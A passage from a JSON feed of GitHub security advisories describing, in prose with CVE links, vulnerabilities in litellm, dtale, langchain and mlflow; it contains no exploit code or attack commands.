            "content_html": "<p>A blind SQL injection vulnerability exists in the berriai/litellm application, specifically within the '/team/update' process. The vulnerability arises due to the improper handling of the 'user_id' parameter in the raw SQL query used for deleting users. An attacker can exploit this vulnerability by injecting malicious SQL commands through the 'user_id' parameter, leading to potential unauthorized access to sensitive information such as API keys, user information, and tokens stored in the database. The affected version is 1.27.14.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4890\">https://nvd.nist.gov/vuln/detail/CVE-2024-4890</a></li>\n<li><a href=\"https://huntr.com/bounties/a4f6d357-5b44-4e00-9cac-f1cc351211d2\">https://huntr.com/bounties/a4f6d357-5b44-4e00-9cac-f1cc351211d2</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/pull/2954\">https://github.com/BerriAI/litellm/pull/2954</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8j42-pcfm-3467\">https://github.com/advisories/GHSA-8j42-pcfm-3467</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8j42-pcfm-3467",
            "title": "[litellm] SQL injection in litellm",
            "date_modified": "2024-06-06T22:53:19.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8j42-pcfm-3467"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>man-group/dtale version 3.10.0 is vulnerable to an authentication bypass and remote code execution (RCE) due to improper input validation. The vulnerability arises from a hardcoded <code>SECRET_KEY</code> in the flask configuration, allowing attackers to forge a session cookie if authentication is enabled. Additionally, the application fails to properly restrict custom filter queries, enabling attackers to execute arbitrary code on the server by bypassing the restriction on the <code>/update-settings</code> endpoint, even when <code>enable_custom_filters</code> is not enabled. This vulnerability allows attackers to bypass authentication mechanisms and execute remote code on the server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3408\">https://nvd.nist.gov/vuln/detail/CVE-2024-3408</a></li>\n<li><a href=\"https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91\">https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v9q6-fm48-rx74\">https://github.com/advisories/GHSA-v9q6-fm48-rx74</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v9q6-fm48-rx74",
            "title": "[dtale] Authentication bypass in dtale",
            "date_modified": "2024-06-06T22:47:25.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v9q6-fm48-rx74"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Server-Side Request Forgery (SSRF) vulnerability exists in the Web Research Retriever component of langchain-ai/langchain version 0.1.5. The vulnerability arises because the Web Research Retriever does not restrict requests to remote internet addresses, allowing it to reach local addresses. This flaw enables attackers to execute port scans, access local services, and in some scenarios, read instance metadata from cloud environments. The vulnerability is particularly concerning as it can be exploited to abuse the Web Explorer server as a proxy for web attacks on third parties and interact with servers in the local network, including reading their response data. This could potentially lead to arbitrary code execution, depending on the nature of the local services. The vulnerability is limited to GET requests, as POST requests are not possible, but the impact on confidentiality, integrity, and availability is significant due to the potential for stolen credentials and state-changing interactions with internal APIs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3095\">https://nvd.nist.gov/vuln/detail/CVE-2024-3095</a></li>\n<li><a href=\"https://huntr.com/bounties/e62d4895-2901-405b-9559-38276b6a5273\">https://huntr.com/bounties/e62d4895-2901-405b-9559-38276b6a5273</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q25c-c977-4cmh\">https://github.com/advisories/GHSA-q25c-c977-4cmh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q25c-c977-4cmh",
            "title": "[langchain] Server-Side Request Forgery in langchain",
            "date_modified": "2024-06-06T22:41:07.000Z",
            "date_published": "2024-06-06T21:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q25c-c977-4cmh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in mlflow/mlflow version 2.11.1 allows attackers to create multiple models with the same name by exploiting URL encoding. This flaw can lead to Denial of Service (DoS) as an authenticated user might not be able to use the intended model, as it will open a different model each time. Additionally, an attacker can exploit this vulnerability to perform data model poisoning by creating a model with the same name, potentially causing an authenticated user to become a victim by using the poisoned model. The issue stems from inadequate validation of model names, allowing for the creation of models with URL-encoded names that are treated as distinct from their URL-decoded counterparts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-3099\">https://nvd.nist.gov/vuln/detail/CVE-2024-3099</a></li>\n<li><a href=\"https://huntr.com/bounties/8d96374a-ce8d-480e-9cb0-0a7e5165c24a\">https://huntr.com/bounties/8d96374a-ce8d-480e-9cb0-0a7e5165c24a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8f8q-q2j7-7j2m\">https://github.com/advisories/GHSA-8f8q-q2j7-7j2m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8f8q-q2j7-7j2m",
            "title": "[mlflow] Undefined Behavior in mlflow",
            "date_modified": "2024-06-06T22:38:43.000Z",
            "date_published": "2024-06-06T21:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8f8q-q2j7-7j2m"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}